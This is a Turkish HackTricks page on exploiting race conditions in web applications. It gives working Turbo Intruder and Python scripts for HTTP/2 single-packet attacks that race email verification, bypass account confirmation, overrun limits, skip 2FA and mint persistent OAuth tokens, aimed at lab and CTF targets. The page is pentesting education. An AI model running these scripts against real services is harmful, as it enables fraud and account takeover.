# YarÄ±ÅŸ KoÅŸulu

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>SÄ±fÄ±rdan Kahraman Olarak AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR'lar gÃ¶nderin.

</details>

{% hint style="warning" %}
Bu teknik hakkÄ±nda derin bir anlayÄ±ÅŸ elde etmek iÃ§in orijinal raporu [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine) kontrol edin.
{% endhint %}

## YarÄ±ÅŸ KoÅŸulu SaldÄ±rÄ±larÄ±nÄ± GeliÅŸtirme

YarÄ±ÅŸ koÅŸullarÄ±ndan faydalanmanÄ±n ana engeli, birden fazla isteÄŸin aynÄ± anda iÅŸlenmesini saÄŸlamaktÄ±r, **iÅŸleme sÃ¼releri arasÄ±nda Ã§ok az fark olmalÄ±dÄ±r - ideal olarak 1 ms'den az**.

Ä°ÅŸte Senkronize Ä°stekler iÃ§in bazÄ± teknikler:

#### HTTP/2 Tek Paket SaldÄ±rÄ±sÄ± vs. HTTP/1.1 Son-Byte Senkronizasyonu

* **HTTP/2**: Tek bir TCP baÄŸlantÄ±sÄ± Ã¼zerinden iki isteÄŸi gÃ¶ndermeyi destekler, aÄŸ gecikmesi etkisini azaltÄ±r. Ancak, sunucu tarafÄ±ndaki deÄŸiÅŸiklikler nedeniyle iki istek, tutarlÄ± bir yarÄ±ÅŸ koÅŸulu sÃ¶mÃ¼rÃ¼sÃ¼ iÃ§in yeterli olmayabilir.
* **HTTP/1.1 'Son-Byte Senkronizasyonu'**: 20-30 isteÄŸin Ã§oÄŸu kÄ±smÄ±nÄ± Ã¶nceden gÃ¶ndermeyi saÄŸlar, kÃ¼Ã§Ã¼k bir parÃ§ayÄ± tutarak, ardÄ±ndan birlikte gÃ¶nderilerek sunucuya aynÄ± anda ulaÅŸÄ±lmasÄ±nÄ± saÄŸlar.

**Son-Byte Senkronizasyonu iÃ§in HazÄ±rlÄ±k** ÅŸunlarÄ± iÃ§erir:

1. AkÄ±ÅŸÄ± sonlandÄ±rmadan baÅŸlÄ±k ve vÃ¼cut verilerini son bayt hariÃ§ gÃ¶nderme.
2. Ä°lk gÃ¶nderimden sonra 100 ms beklemek.
3. Son Ã§erÃ§eveleri toplu olarak gÃ¶ndermek iÃ§in TCP\_NODELAY'i devre dÄ±ÅŸÄ± bÄ±rakma.
4. BaÄŸlantÄ±yÄ± Ä±sÄ±tmak iÃ§in ping gÃ¶nderme.

Tutulan Ã§erÃ§evelerin sonraki gÃ¶nderimi, Wireshark aracÄ±lÄ±ÄŸÄ±yla tek bir pakette varÄ±ÅŸlarÄ±nÄ± saÄŸlamalÄ±dÄ±r. Bu yÃ¶ntem genellikle RC saldÄ±rÄ±larÄ±yla iliÅŸkilendirilmeyen statik dosyalara uygulanmaz.

### Sunucu Mimarisiyle Uyum SaÄŸlama

Hedefin mimarisini anlamak Ã¶nemlidir. Ã–n uÃ§ sunucularÄ± istekleri farklÄ± yÃ¶nlendirebilir ve zamanlamayÄ± etkileyebilir. Ã–nleyici sunucu tarafÄ± baÄŸlantÄ± Ä±sÄ±nmasÄ±, Ã¶nemsiz istekler aracÄ±lÄ±ÄŸÄ±yla, istek zamanlamasÄ±nÄ± normalize edebilir.

#### Oturum TabanlÄ± Kilitleri Ele Alma

PHP'nin oturum iÅŸleyicisi gibi Ã§erÃ§eveler, oturum baÅŸÄ±na istekleri serileÅŸtirerek, zayÄ±f noktalarÄ± gizleyebilir. Her istek iÃ§in farklÄ± oturum belirteÃ§leri kullanmak, bu sorunu atlatmaya yardÄ±mcÄ± olabilir.

#### HÄ±z veya Kaynak SÄ±nÄ±rlarÄ±nÄ± AÅŸma

BaÄŸlantÄ± Ä±sÄ±nmasÄ± etkisizse, web sunucularÄ±nÄ±n hÄ±z veya kaynak sÄ±nÄ±rlarÄ±nÄ± kasÄ±tlÄ± olarak tetikleyerek, sunucu tarafÄ±nda yarÄ±ÅŸ koÅŸullarÄ±na uygun gecikmeyi saÄŸlayan tek paket saldÄ±rÄ±sÄ±nÄ± kolaylaÅŸtÄ±rabilir.

## SaldÄ±rÄ± Ã–rnekleri

* **Tubo Intruder - HTTP2 tek paket saldÄ±rÄ±sÄ± (1 uÃ§ nokta)**: Ä°steÄŸi **Turbo intruder**'a gÃ¶nderebilirsiniz (`UzantÄ±lar` -> `Turbo Intruder` -> `Turbo Intruder'a GÃ¶nder`), istekte **`%s`** iÃ§in kaba kuvvet yapmak istediÄŸiniz deÄŸeri deÄŸiÅŸtirebilirsiniz, Ã¶rneÄŸin `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` ve ardÄ±ndan aÃ§Ä±lÄ±r menÃ¼den **`examples/race-single-packer-attack.py`**'yi seÃ§ebilirsiniz:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**FarklÄ± deÄŸerler gÃ¶nderecekseniz**, bu kodu panodan kelime listesi kullanan bir kodla deÄŸiÅŸtirebilirsiniz.
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
EÄŸer web HTTP2'yi desteklemiyorsa (yalnÄ±zca HTTP1.1), `Engine.BURP2` yerine `Engine.THREADED` veya `Engine.BURP` kullanÄ±n.
{% endhint %}

* **Tubo Intruder - HTTP2 tek paket saldÄ±rÄ±sÄ± (Ã‡eÅŸitli uÃ§ noktalar)**: RCE'yi tetiklemek iÃ§in bir uÃ§ noktaya bir istek gÃ¶ndermeniz ve ardÄ±ndan diÄŸer uÃ§ noktalara birden fazla istek gÃ¶ndermeniz gerektiÄŸinde, `race-single-packet-attack.py` betiÄŸini aÅŸaÄŸÄ±daki gibi deÄŸiÅŸtirebilirsiniz:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Yeni '**Paralel olarak grup gÃ¶nder**' seÃ§eneÄŸi ile **Repeater** Ã¼zerinden de mevcuttur.
* **Limit aÅŸÄ±mÄ±** iÃ§in grup iÃ§ine **aynÄ± isteÄŸi 50 kez ekleyebilirsiniz**.
* **BaÄŸlantÄ± Ä±sÄ±nmasÄ±** iÃ§in, web sunucusunun statik olmayan bir kÄ±smÄ±na bazÄ± **istekler** ekleyebilirsiniz.
* **Bir isteÄŸi iÅŸleme** ve **baÅŸka bir isteÄŸi** iÅŸleme arasÄ±ndaki sÃ¼reyi geciktirmek iÃ§in, her iki istek arasÄ±na **ek istekler ekleyebilirsiniz**.
* **Ã‡oklu uÃ§lu** bir RC iÃ§in, **gizli duruma giden isteÄŸi** gÃ¶ndermeye baÅŸlayabilir ve ardÄ±ndan **gizli durumu sÃ¶mÃ¼ren 50 isteÄŸi** hemen gÃ¶nderebilirsiniz.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* **Otomatik python betiÄŸi**: Bu betiÄŸin amacÄ±, bir kullanÄ±cÄ±nÄ±n e-posta adresini sÃ¼rekli olarak doÄŸrulayarak deÄŸiÅŸtirmektir, yeni e-posta adresinin doÄŸrulama belirteci eski e-postaya ulaÅŸana kadar (Ã§Ã¼nkÃ¼ kodda, e-postayÄ± deÄŸiÅŸtirmenin mÃ¼mkÃ¼n olduÄŸu ancak doÄŸrulamanÄ±n eski e-postaya gÃ¶nderildiÄŸi bir RC gÃ¶rÃ¼lÃ¼yordu Ã§Ã¼nkÃ¼ e-postayÄ± belirten deÄŸiÅŸken zaten ilk e-postayla doldurulmuÅŸtu).\
"objetivo" kelimesi alÄ±nan e-postalarda bulunduÄŸunda, deÄŸiÅŸtirilen e-postanÄ±n doÄŸrulama belirteci alÄ±ndÄ±ÄŸÄ±nÄ± biliriz ve saldÄ±rÄ±yÄ± sonlandÄ±rÄ±rÄ±z.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Ham BF

Ã–nceki araÅŸtÄ±rmadan Ã¶nce, yalnÄ±zca bir YC oluÅŸturmak iÃ§in paketleri mÃ¼mkÃ¼n olduÄŸunca hÄ±zlÄ± bir ÅŸekilde gÃ¶ndermeye Ã§alÄ±ÅŸan bazÄ± kullanÄ±lan yÃ¼klerdi.

* **TekrarlayÄ±cÄ±:** Ã–nceki bÃ¶lÃ¼mden Ã¶rnekleri kontrol edin.
* **SÄ±zdÄ±ran:** **Ä°steÄŸi** **SÄ±zdÄ±ran**'a gÃ¶nderin, **SeÃ§enekler** menÃ¼sÃ¼nde **30** **iÅŸ parÃ§aÄŸÄ± sayÄ±sÄ±nÄ±** ayarlayÄ±n ve **BoÅŸ yÃ¼kler** olarak seÃ§in ve **30** oluÅŸturun.
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **YarÄ±ÅŸ KoÅŸulu Metodolojisi**

### Limit aÅŸÄ±mÄ± / TOCTOU

Bu, bir eylemi gerÃ§ekleÅŸtirebileceÄŸiniz sayÄ±yÄ± sÄ±nÄ±rlayan yerlerde ortaya Ã§Ä±kan **zayÄ±flÄ±klarÄ±n** en temel tÃ¼rÃ¼dÃ¼r. Ã–rneÄŸin, bir web maÄŸazasÄ±nda aynÄ± indirim kodunu birkaÃ§ kez kullanmak gibi. Ã‡ok basit bir Ã¶rnek [**bu raporda**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) veya [**bu hata**](https://hackerone.com/reports/759247)'da bulunabilir.

Bu tÃ¼r saldÄ±rÄ±larÄ±n birÃ§ok varyasyonu vardÄ±r, bunlar arasÄ±nda:

* Bir hediye kartÄ±nÄ± birden fazla kez kullanmak
* Bir Ã¼rÃ¼nÃ¼ birden fazla kez derecelendirmek
* Hesap bakiyenizi aÅŸan miktarda para Ã§ekmek veya transfer etmek
* Tek bir CAPTCHA Ã§Ã¶zÃ¼mÃ¼nÃ¼ tekrar kullanmak
* Bir anti-brute-force hÄ±z sÄ±nÄ±rÄ±nÄ± aÅŸmak

### **Gizli alt durumlar**

KarmaÅŸÄ±k yarÄ±ÅŸ koÅŸullarÄ±nÄ± sÃ¶mÃ¼rmek genellikle gizli veya **istenmeyen makine alt durumlarÄ±** ile etkileÅŸim fÄ±rsatlarÄ±ndan yararlanmayÄ± iÃ§erir. Ä°ÅŸte bu konuya nasÄ±l yaklaÅŸÄ±lacaÄŸÄ±:

1. **Potansiyel Gizli Alt DurumlarÄ± TanÄ±mlayÄ±n**
* Kritik verileri deÄŸiÅŸtiren veya etkileÅŸime giren uÃ§ noktalarÄ± belirleyerek baÅŸlayÄ±n, Ã¶rneÄŸin kullanÄ±cÄ± profilleri veya ÅŸifre sÄ±fÄ±rlama sÃ¼reÃ§leri. OdaklanÄ±lacak noktalar:
* **Depolama**: Sunucu tarafÄ±nda kalÄ±cÄ± verileri iÅŸleyen uÃ§ noktalarÄ±, istemci tarafÄ±ndaki verileri iÅŸleyenlere gÃ¶re tercih edin.
* **Eylem**: Var olan verileri deÄŸiÅŸtiren iÅŸlemleri arayÄ±n, yeni veri ekleyenlere gÃ¶re sÃ¶mÃ¼rÃ¼lebilir koÅŸullar yaratma olasÄ±lÄ±ÄŸÄ± daha yÃ¼ksektir.
* **Anahtarlama**: BaÅŸarÄ±lÄ± saldÄ±rÄ±lar genellikle aynÄ± tanÄ±mlayÄ±cÄ±ya (Ã¶rneÄŸin, kullanÄ±cÄ± adÄ± veya sÄ±fÄ±rlama belirteci) dayalÄ± iÅŸlemleri iÃ§erir.
2. **Ä°lk SondajÄ± YapÄ±n**
* Belirlenen uÃ§ noktalarÄ± yarÄ±ÅŸ koÅŸulu saldÄ±rÄ±larÄ±yla test ederek beklenen sonuÃ§lardan herhangi bir sapma olup olmadÄ±ÄŸÄ±nÄ± gÃ¶zlemleyin. Beklenmeyen yanÄ±tlar veya uygulama davranÄ±ÅŸÄ±ndaki deÄŸiÅŸiklikler, bir zayÄ±flÄ±k iÅŸareti olabilir.
3. **Zafiyeti GÃ¶sterin**
* Zafiyeti sÃ¶mÃ¼rmek iÃ§in genellikle sadece iki isteÄŸin gerektiÄŸi minimum sayÄ±da isteÄŸe odaklanÄ±n. Bu adÄ±m, hassas zamanlama nedeniyle birden fazla deneme veya otomasyon gerektirebilir.

### Zaman Hassas SaldÄ±rÄ±lar

Ä°steklerdeki zamanlama hassasiyeti, Ã¶zellikle gÃ¼venlik belirteÃ§leri iÃ§in zaman damgalarÄ±nÄ±n kullanÄ±ldÄ±ÄŸÄ± tahmin edilebilir yÃ¶ntemlerin kullanÄ±ldÄ±ÄŸÄ± durumlarda zayÄ±flÄ±klarÄ± ortaya Ã§Ä±karabilir. Ã–rneÄŸin, zaman damgalarÄ±na dayalÄ± ÅŸifre sÄ±fÄ±rlama belirteÃ§leri oluÅŸturmak, eÅŸzamanlÄ± istekler iÃ§in aynÄ± belirteÃ§lere izin verebilir.

**SÃ¶mÃ¼rmek Ä°Ã§in:**

* EÅŸzamanlÄ± ÅŸifre sÄ±fÄ±rlama istekleri yapmak iÃ§in tek paket saldÄ±rÄ±sÄ± gibi hassas zamanlama kullanÄ±n. EÅŸleÅŸen belirteÃ§ler bir zayÄ±flÄ±ÄŸÄ± gÃ¶sterebilir.

**Ã–rnek:**

* AynÄ± anda iki ÅŸifre sÄ±fÄ±rlama belirteci isteyin ve karÅŸÄ±laÅŸtÄ±rÄ±n. EÅŸleÅŸen belirteÃ§ler, belirteÃ§ oluÅŸturmada bir hata olduÄŸunu gÃ¶sterebilir.

**Bunu denemek iÃ§in** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **sayfasÄ±na bakÄ±n.**

## Gizli alt durumlar vaka Ã§alÄ±ÅŸmalarÄ±

### Ã–deme yap ve bir Ã–ÄŸe ekle

**Ã–deme** yapÄ±n ve **Ã¶demeniz gerekmeyen** ek bir Ã¶ÄŸe **ekleyin** nasÄ±l yapÄ±lacaÄŸÄ±nÄ± gÃ¶rmek iÃ§in bu [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)'a bakÄ±n.

### DiÄŸer e-postalarÄ± onayla

Fikir, **bir e-posta adresini doÄŸrulamak ve aynÄ± anda farklÄ± bir e-posta adresine deÄŸiÅŸtirmek** ve platformun yeni deÄŸiÅŸtirileni doÄŸrulayÄ±p doÄŸrulamadÄ±ÄŸÄ±nÄ± bulmaktÄ±r.

### 2 e-posta adresine e-posta deÄŸiÅŸtirme Ã‡erez tabanlÄ±

[**Bu araÅŸtÄ±rmaya**](https://portswigger.net/research/smashing-the-state-machine) gÃ¶re Gitlab, bir e-postanÄ±n doÄŸrulama belirtecinin diÄŸer e-postaya **gÃ¶nderilebileceÄŸi** iÃ§in bu ÅŸekilde ele geÃ§irilebilir.

Bunu denemek iÃ§in [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **sayfasÄ±na bakÄ±n.**

### Gizli VeritabanÄ± durumlarÄ± / OnayÄ± Atlatma

EÄŸer bir **veritabanÄ±na bilgi eklemek** iÃ§in **2 farklÄ± yazma iÅŸlemi** kullanÄ±lÄ±yorsa, **sadece ilk verinin** veritabanÄ±na yazÄ±ldÄ±ÄŸÄ± kÃ¼Ã§Ã¼k bir zaman dilimi olabilir. Ã–rneÄŸin, bir kullanÄ±cÄ± oluÅŸturulurken **kullanÄ±cÄ± adÄ±** ve **ÅŸifre** yazÄ±labilir ve ardÄ±ndan yeni oluÅŸturulan hesabÄ± onaylamak iÃ§in **belirteÃ§** yazÄ±labilir. Bu, bir hesabÄ±n onaylanmasÄ± iÃ§in **belirtecin bir sÃ¼re boÅŸ** olabileceÄŸi anlamÄ±na gelir.

Bu nedenle, bir hesap kaydedin ve hemen hesabÄ± onaylamak iÃ§in boÅŸ bir belirteÃ§le (`token=` veya `token[]=` veya baÅŸka bir varyasyon) birkaÃ§ istek gÃ¶ndermek, kontrol etmediÄŸiniz bir e-postayÄ± **onaylamanÄ±za** olanak tanÄ±yabilir.

Bunu denemek iÃ§in [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **sayfasÄ±na bakÄ±n.**

### 2FA'yÄ± Atlatma

AÅŸaÄŸÄ±daki sÃ¶zdizimi, oturum oluÅŸturulurken **2FA'nÄ±n zorunlu olmadÄ±ÄŸÄ±** iÃ§in yarÄ±ÅŸ koÅŸuluna karÅŸÄ± savunmasÄ±zdÄ±r:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 sonsuz kalÄ±cÄ±lÄ±k

BirkaÃ§ [**OAuth saÄŸlayÄ±cÄ±sÄ±**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers) bulunmaktadÄ±r. Bu hizmetler, saÄŸlayÄ±cÄ±nÄ±n kaydettiÄŸi kullanÄ±cÄ±larÄ± doÄŸrulamanÄ±za ve bir uygulama oluÅŸturmanÄ±za izin verir. Bunun iÃ§in **istemci**, **uygulamanÄ±za eriÅŸim izni vermek** iÃ§in kullanÄ±cÄ±larÄ±n **OAuth saÄŸlayÄ±cÄ±sÄ±** iÃ§indeki bazÄ± verilerine eriÅŸimine izin vermesi gerekecektir.\
Yani, ÅŸu ana kadar sadece google/linkedin/github... ile yapÄ±lan ortak bir giriÅŸte olduÄŸu gibi bir sayfada "_Uygulama \<InsertCoolName>, bilgilerinize eriÅŸmek istiyor, izin vermek istiyor musunuz?_" ÅŸeklinde bir uyarÄ± alÄ±rsÄ±nÄ±z.

#### `authorization_code` iÃ§indeki YarÄ±ÅŸ KoÅŸulu

**Sorun**, bunu **kabul ettiÄŸinizde** ve kÃ¶tÃ¼ niyetli uygulamaya otomatik olarak bir **`authorization_code`** gÃ¶nderildiÄŸinde ortaya Ã§Ä±kar. ArdÄ±ndan, bu **uygulama, OAuth hizmet saÄŸlayÄ±cÄ±sÄ±ndaki YarÄ±ÅŸ KoÅŸulunu kÃ¶tÃ¼ye kullanarak hesabÄ±nÄ±z iÃ§in **`authorization_code`**'dan daha fazla AT/RT (_Kimlik DoÄŸrulama Jetonu/Yenileme Jetonu_) oluÅŸturur. Temelde, uygulamanÄ±n verilerinize eriÅŸim iznini kabul ettiÄŸiniz gerÃ§eÄŸini kÃ¶tÃ¼ye kullanacaktÄ±r ve **birkaÃ§ hesap oluÅŸturacaktÄ±r**. Sonra, eÄŸer **uygulamanÄ±n verilerinize eriÅŸim iznini kaldÄ±rÄ±rsanÄ±z bir AT/RT Ã§ifti silinecek, ancak diÄŸerleri hala geÃ§erli olacaktÄ±r**.

#### `Refresh Token` iÃ§indeki YarÄ±ÅŸ KoÅŸulu

GeÃ§erli bir RT aldÄ±ktan sonra, bunu kullanarak birkaÃ§ AT/RT oluÅŸturmaya Ã§alÄ±ÅŸabilir ve **kullanÄ±cÄ± kÃ¶tÃ¼ niyetli uygulamanÄ±n verilerine eriÅŸim iznini iptal etse bile, birkaÃ§ RT hala geÃ§erli olacaktÄ±r**.

## **WebSockets'te YarÄ±ÅŸ KoÅŸulu**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) iÃ§inde, **Web Sockets'te de YarÄ±ÅŸ KoÅŸullarÄ±nÄ± kÃ¶tÃ¼ye kullanmak iÃ§in paralel olarak websocket mesajlarÄ± gÃ¶ndermek** iÃ§in bir Java PoC bulabilirsiniz.

## Referanslar

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>SÄ±fÄ±rdan baÅŸlayarak AWS hacklemeyi</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek destek olun.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturmak ve otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
